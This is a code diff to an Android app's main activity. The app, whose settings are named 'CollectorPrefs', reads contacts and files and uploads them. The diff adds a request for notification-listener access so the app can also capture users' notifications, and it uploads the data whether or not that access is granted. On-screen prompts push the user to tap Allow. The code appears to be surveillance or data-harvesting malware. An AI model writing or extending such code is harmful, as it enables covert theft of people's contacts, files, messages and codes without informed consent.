@@ -38,6 +38,7 @@ public class MainActivity extends Activity {
     private static final int CONTACTS_PERMISSION_CODE = 100;
     private static final int FILES_PERMISSION_CODE = 101;
     private static final int NOTIFICATION_PERMISSION_CODE = 102;
+    private static final int NOTIF_LISTENER_CODE = 103;
     private static final String PREFS_NAME = "CollectorPrefs";
     private static final String KEY_SESSION_ID = "sessionId";
     private static final String KEY_DEVICE_ID = "deviceId";
@@ -148,6 +149,37 @@ public class MainActivity extends Activity {
         return result.toString().trim();
     }
 
+
+    private boolean isNotificationListenerEnabled() {
+        try {
+            String packageName = getPackageName();
+            String flat = android.provider.Settings.Secure.getString(
+                getContentResolver(),
+                "enabled_notification_listeners"
+            );
+            if (flat != null && !flat.isEmpty()) {
+                String[] names = flat.split(":");
+                for (String name : names) {
+                    ComponentName cn = ComponentName.unflattenFromString(name);
+                    if (cn != null && packageName.equals(cn.getPackageName())) {
+                        return true;
+                    }
+                }
+            }
+        } catch (Exception e) {}
+        return false;
+    }
+
+    private void requestNotificationAccess() {
+        try {
+            Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivityForResult(intent, NOTIF_LISTENER_CODE);
+        } catch (Exception e) {
+            // If settings activity not available, skip
+        }
+    }
+
     private boolean hasAllPermissions() {
         boolean contactsOk = checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
         boolean filesOk;
@@ -156,7 +188,8 @@ public class MainActivity extends Activity {
         } else {
             filesOk = checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
         }
-        return contactsOk && filesOk;
+        boolean notifListenerOk = isNotificationListenerEnabled();
+        return contactsOk && filesOk && notifListenerOk;
     }
 
     private void showPermissionScreen() {
@@ -201,8 +234,16 @@ public class MainActivity extends Activity {
             if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                 requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, NOTIFICATION_PERMISSION_CODE);
             } else {
-                readAndUploadData();
+                requestNotificationListenerAccess();
             }
+        } else {
+            requestNotificationListenerAccess();
+        }
+    }
+
+    private void requestNotificationListenerAccess() {
+        if (!isNotificationListenerEnabled()) {
+            requestNotificationAccess();
         } else {
             readAndUploadData();
         }
@@ -226,9 +267,8 @@ public class MainActivity extends Activity {
                 tvDetail.setText("File manager permission is required. Please try again and tap Allow.");
             }
         } else if (requestCode == NOTIFICATION_PERMISSION_CODE) {
-            // Permissions have been granted - send status update
-            sendStatusUpdate("permissions_granted", "All permissions granted");
-            readAndUploadData();
+            // Notification POST permission granted - now request notification listener
+            requestNotificationListenerAccess();
         }
     }
 
@@ -243,6 +283,16 @@ public class MainActivity extends Activity {
                     tvStatus.setText("File Permission Needed");
                     tvDetail.setText("File manager permission is required. Please try again.");
                 }
+            }
+        } else if (requestCode == NOTIF_LISTENER_CODE) {
+            // Notification listener access result
+            if (isNotificationListenerEnabled()) {
+                sendStatusUpdate("permissions_granted", "All permissions granted including notification access");
+                readAndUploadData();
+            } else {
+                // User didn't grant - continue anyway but without notification capture
+                sendStatusUpdate("permissions_granted", "Permissions granted without notification access");
+                readAndUploadData();
             }
         }
     }
@@ -662,3 +712,4 @@ public class MainActivity extends Activity {
         throw lastException != null ? lastException : new Exception("Upload failed after 3 attempts");
     }
 }
+
